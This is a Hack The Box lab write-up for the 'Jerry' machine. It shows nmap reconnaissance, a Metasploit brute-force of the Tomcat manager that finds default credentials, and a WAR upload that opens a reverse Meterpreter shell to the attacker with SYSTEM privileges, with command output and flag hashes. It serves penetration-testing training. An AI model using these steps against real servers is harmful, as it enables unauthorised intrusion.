# HTB: Jerry

**Operating System:** Windows  
**Difficulty:** Easy  
**Author:** mrh4sh  
**Date of Engagement:** 2025-07-30

---

## Engagement Overview

**Target IP:** 10.10.10.95 
**Local IP:** 10.10.16.9  
**Objective Summary:**
- Exploit Apache Tomcat
- Gain a `NT Authority\SYSTEM` shell
- Fully compromising the target

---

## Initial Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -A -o nmap.txt 10.10.10.95
```

**Result Summary:**
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

### Host Info

```
Microsoft Windows Server 2012 R2
```

---

## Methodologies

### Initial Access –

**Metasploit**
- Found credentials:
```
msf6 auxiliary(scanner/http/tomcat_mgr_login run
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Tools & Payloads Used:**
- Metasploit

**Penetration Result:**  
```
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
[*] Started reverse TCP handler on 10.10.16.9:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying bJKTyJ1deM...
[*] Executing bJKTyJ1deM...
[*] Sending stage (58073 bytes) to 10.10.10.95
[*] Undeploying bJKTyJ1deM ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.10.16.9:4444 -> 10.10.10.95:49192) at 2025-07-30 15:56:40 -0400

meterpreter > getuid
Server username: JERRY$
meterpreter > 
```

---

## Privilege Escalation

Not applicable. Initial exploit yielded SYSTEM-level shell.

```
meterpreter > shell
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>
```
---

## House Cleaning

- No post-exploitation persistence left on target
- Exploit did not require uploads beyond shell payload

---

## Post-Exploitation

### Credentials & Flags

- `user.txt`: `7004dbcef0f854e0fb401875f26ebd00`  
- `root.txt`: `b6b9cccdf6904e9ffdb0110122a50a43`

---

## Tools Utilized

* nmap
* metasploit

---

## Key Takeaways

* Enumerating Tomcat credentials via Metasploit
* Abusing Tomcat WAR uploads via Metasploit